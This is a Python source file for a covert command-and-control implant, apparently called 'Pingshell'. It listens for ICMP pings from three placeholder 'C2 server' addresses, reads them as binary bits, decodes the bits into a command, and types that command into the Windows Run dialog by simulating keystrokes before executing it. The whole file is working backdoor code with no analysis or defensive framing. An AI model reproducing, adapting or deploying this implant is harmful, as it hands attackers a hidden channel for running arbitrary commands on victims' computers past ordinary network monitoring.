import time
import platform
from scapy.all import sniff, IP, ICMP, get_if_addr
from pynput.keyboard import Controller, Key

# Get host's own IP to avoid self-detection
host_ip = get_if_addr("Ethernet")  # Change "Ethernet" to correct interface if needed

# C2 Server IPs
addr1 = "420.69.96.421"
addr2 = "420.69.96.422"
addr3 = "420.69.96.423"

# Store incoming binary data in memory instead of a file
binary_buffer = ""

# Global keyboard controller
keyboard = Controller()

def press_windows_r():
    """ Simulates pressing Windows+R and waits for the Run dialog to appear """
    keyboard.press(Key.cmd)
    keyboard.press('r')
    keyboard.release('r')
    keyboard.release(Key.cmd)
    time.sleep(2)  # Increased delay to ensure Run dialog is open

def binary_to_text(binary_str):
    """ Converts a binary string to text, ensuring only full bytes are processed """
    if len(binary_str) % 8 != 0:
        print(f"[!] Warning: Incomplete byte detected! Binary length: {len(binary_str)}")
        binary_str = binary_str[:-(len(binary_str) % 8)]  # Trim off incomplete bits
    
    try:
        chunks = [binary_str[i:i+8] for i in range(0, len(binary_str), 8)]
        text = "".join(chr(int(chunk, 2)) for chunk in chunks)
        return text
    except ValueError as e:
        print(f"[!] Error in binary conversion: {e}")
        return None

def type_text(text):
    """ Types the given text into the active window """
    for char in text:
        keyboard.press(char)
        keyboard.release(char)
        time.sleep(0.05)  # Slight delay for more reliable input

def execute_payload():
    """ Simulates pressing Enter and Left Arrow to execute the command """
    #keyboard.press(Key.ctrl)
    #keyboard.press(Key.shift)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
    #keyboard.release(Key.ctrl)
    #keyboard.release(Key.shift)
    #keyboard.press(Key.left)
    #keyboard.release(Key.left)
    time.sleep(0.5)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)

def icmp_handler(pkt):
    """ Processes incoming ICMP Echo Requests and handles data """
    global binary_buffer

    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:  # Type 8 = Echo Request
        src_ip = pkt[IP].src

        if src_ip == host_ip:
            return  # Ignore self-pings

        print(f"[*] ICMP Echo Request received from {src_ip}")

        if src_ip == addr1:
            print("# Packet matches addr1")
            binary_buffer += "0"
            print(f"Current binary_buffer: {binary_buffer}")

        elif src_ip == addr2:
            print("# Packet matches addr2")
            binary_buffer += "1"
            print(f"Current binary_buffer: {binary_buffer}")

        elif src_ip == addr3:
            print("# Packet matches addr3 (Processing binary data)")

            if binary_buffer:
                print(f"[DEBUG] Final Binary Buffer Before Conversion: {binary_buffer} (Length: {len(binary_buffer)})")
                plaintext = binary_to_text(binary_buffer)
                if plaintext:
                    press_windows_r()
                    time.sleep(1)  # Ensure Run dialog is active
                    type_text(plaintext)
                    time.sleep(1)
                    print(plaintext)
                    time.sleep(0.5)
                    execute_payload()
                    binary_buffer = ""  # Clear buffer after execution
                else:
                    print("Invalid binary input")
            else:
                print("Binary buffer is empty")
        else:
            print(f"[!] Unexpected ICMP packet from {src_ip}")

def main():
    print("[*] Pingshell is now listening for ICMP Echo Requests...")
    sniff(filter="icmp", prn=icmp_handler, store=False)  # Consider adding iface="Ethernet" or "wlan0"

#if __name__ == "__main__":
#    main()
